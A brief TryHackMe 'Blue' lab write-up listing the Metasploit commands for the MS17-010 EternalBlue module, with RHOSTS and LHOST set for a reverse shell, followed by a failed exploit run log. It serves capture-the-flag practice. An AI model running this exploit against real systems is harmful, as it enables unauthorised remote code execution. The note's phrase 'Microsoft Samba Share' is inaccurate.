# TryHackMe - BLUE

More metasploit practice

## MS SMB (ms17-010 exploitation)

Microsoft Samba Share - Remote Code Execution exploit

```
msfconsole
use exploit/windows/smb/ms17_010_eternalblue_win8
```

```
# for host exploitation
set RHOSTS <TryHackMe-Box-IP>
# for local reverse shell interception
set LHOST <TryHackMe-tun0-VPN-IP>
```

```
# foreground exploit run
exploit 
-or- 
# background exploit run
run -js
```

**Stuck here** 
```
exploit
...
[*] 10.10.254.39:445 - Receiving response from exploit packet
[-] 10.10.254.39:445 - Did not receive a response from exploit packet
[*] 10.10.254.39:445 - Sending egg to corrupted connection.
[-] 10.10.254.39:445 - Errno::ECONNRESET: Connection reset by peer
```